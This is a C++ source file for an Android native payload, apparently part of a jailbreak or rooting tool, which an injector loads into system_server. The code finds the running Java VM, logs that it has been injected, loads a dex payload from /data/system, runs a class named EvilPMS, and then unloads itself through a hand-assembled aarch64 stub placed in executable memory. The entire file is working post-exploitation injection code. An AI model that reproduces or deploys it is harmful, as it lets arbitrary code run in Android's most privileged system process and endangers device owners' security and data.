#include <android/log.h>
#include <dlfcn.h>
#include <jni.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

#include <cstdio>
#include <cstring>
#include <string>

#define TAG "JBCompanion"
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

static constexpr const char *LOG_ACTION = "jb.companion.PAYLOAD_LOG";
static constexpr const char *LOG_EXTRA  = "msg";

static void send_log(JNIEnv *env, jobject context, const char *msg) {
    LOGE("%s", msg);

    jclass intent_class = env->FindClass("android/content/Intent");
    jmethodID ctor = env->GetMethodID(intent_class, "<init>",
                                      "(Ljava/lang/String;)V");
    jstring action = env->NewStringUTF(LOG_ACTION);
    jobject intent = env->NewObject(intent_class, ctor, action);

    jmethodID put_extra = env->GetMethodID(intent_class, "putExtra",
        "(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;");
    env->CallObjectMethod(intent, put_extra,
                          env->NewStringUTF(LOG_EXTRA),
                          env->NewStringUTF(msg));

    jclass ctx_class = env->FindClass("android/content/Context");
    jmethodID send = env->GetMethodID(ctx_class, "sendBroadcast",
                                      "(Landroid/content/Intent;)V");
    env->CallVoidMethod(context, send, intent);

    if (env->ExceptionCheck()) {
        LOGE("send_log: sendBroadcast threw");
        env->ExceptionDescribe();
        env->ExceptionClear();
    }
}

static void unload_self(void *handle) {
    // aarch64: blr x1 (dlclose(x0=handle)); mov x0,#0; mov x8,#93; svc #0
    static const uint32_t stub_code[] = {
        0xd63f0020u, // blr x1
        0xd2800000u, // mov x0, #0
        0xd2800ba8u, // mov x8, #93 (__NR_exit)
        0xd4000001u, // svc #0
    };

    void *dlclose_fn = dlsym(RTLD_DEFAULT, "dlclose");
    void *stub = mmap(nullptr, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    if (!dlclose_fn || stub == MAP_FAILED) {
        if (stub != MAP_FAILED) munmap(stub, 4096);
        pthread_exit(nullptr);
        return;
    }

    memcpy(stub, stub_code, sizeof(stub_code));
    __builtin___clear_cache(static_cast<char *>(stub),
                            static_cast<char *>(stub) + sizeof(stub_code));

    reinterpret_cast<void (*)(void *, void *)>(stub)(handle, dlclose_fn);
    __builtin_unreachable();
}

struct WorkerArgs {
    JavaVM *jvm;
    void   *handle;
};

static void *worker_thread(void *arg) {
    auto *wa = static_cast<WorkerArgs *>(arg);
    JavaVM *jvm    = wa->jvm;
    void   *handle = wa->handle;
    delete wa;

    JNIEnv *env = nullptr;
    if (jvm->AttachCurrentThread(&env, nullptr) != JNI_OK || !env) {
        LOGE("[x] worker AttachCurrentThread failed");
        unload_self(handle);
        return nullptr;
    }

    jclass at_class = env->FindClass("android/app/ActivityThread");
    jmethodID cur_app = env->GetStaticMethodID(at_class, "currentApplication",
                                               "()Landroid/app/Application;");
    jobject context = env->CallStaticObjectMethod(at_class, cur_app);
    if (!context || env->ExceptionCheck()) {
        LOGE("[x] worker currentApplication() failed");
        env->ExceptionClear();
        jvm->DetachCurrentThread();
        unload_self(handle);
        return nullptr;
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "[+] injected into system_server, uid=%d", getuid());
    send_log(env, context, buf);

    jclass cl_class = env->FindClass("java/lang/ClassLoader");
    jmethodID get_sys = env->GetStaticMethodID(cl_class, "getSystemClassLoader",
                                               "()Ljava/lang/ClassLoader;");
    jobject parent_cl = env->CallStaticObjectMethod(cl_class, get_sys);

    jclass dcl_class = env->FindClass("dalvik/system/DexClassLoader");
    jmethodID dcl_ctor = env->GetMethodID(dcl_class, "<init>",
        "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");

    jstring apk_jstr = env->NewStringUTF("/data/system/jb.companion_payload.apk");
    jobject dex_loader = env->NewObject(dcl_class, dcl_ctor,
                                        apk_jstr, nullptr, nullptr, parent_cl);
    if (!dex_loader || env->ExceptionCheck()) {
        LOGE("[x] DexClassLoader init failed");
        env->ExceptionDescribe();
        env->ExceptionClear();
        jvm->DetachCurrentThread();
        unload_self(handle);
        return nullptr;
    }

    jmethodID load_class = env->GetMethodID(
        env->FindClass("java/lang/ClassLoader"), "loadClass",
        "(Ljava/lang/String;)Ljava/lang/Class;");
    jstring cls_name = env->NewStringUTF("jb.companion.EvilPMS");
    jclass evil_cls = (jclass)env->CallObjectMethod(dex_loader, load_class, cls_name);
    if (!evil_cls || env->ExceptionCheck()) {
        LOGE("[x] loadClass(EvilPMS) failed");
        env->ExceptionDescribe();
        env->ExceptionClear();
        jvm->DetachCurrentThread();
        unload_self(handle);
        return nullptr;
    }

    jmethodID main_method = env->GetStaticMethodID(evil_cls, "main",
                                                    "([Ljava/lang/String;)V");
    if (!main_method || env->ExceptionCheck()) {
        LOGE("[x] GetStaticMethodID(main) failed");
        env->ExceptionDescribe();
        env->ExceptionClear();
        jvm->DetachCurrentThread();
        unload_self(handle);
        return nullptr;
    }

    jobjectArray args = env->NewObjectArray(
        0, env->FindClass("java/lang/String"), nullptr);
    env->CallStaticVoidMethod(evil_cls, main_method, args);
    if (env->ExceptionCheck()) {
        LOGE("[x] EvilFactory.main threw");
        env->ExceptionDescribe();
        env->ExceptionClear();
    } else {
        LOGE("[+] payload complete");
    }

    jvm->DetachCurrentThread();
    unload_self(handle);
    return nullptr;
}

extern "C" void entry(void *handle) {
    using GetVMs_t = jint(*)(JavaVM**, jsize, jsize*);
    auto get_vms = reinterpret_cast<GetVMs_t>(dlsym(RTLD_DEFAULT, "JNI_GetCreatedJavaVMs"));
    if (!get_vms) {
        LOGE("[x] dlsym(JNI_GetCreatedJavaVMs) failed: %s", dlerror());
        return;
    }

    JavaVM *jvm = nullptr;
    jsize count = 0;
    if (get_vms(&jvm, 1, &count) != JNI_OK || count == 0 || !jvm) {
        LOGE("[x] JNI_GetCreatedJavaVMs failed");
        return;
    }

    auto *wa = new WorkerArgs{jvm, handle};

    pthread_t t;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&t, &attr, worker_thread, wa) != 0) {
        LOGE("[x] pthread_create failed");
        delete wa;
    }
    pthread_attr_destroy(&attr);
    // entry() returns immediately — injector cleanly restores regs and detaches
}
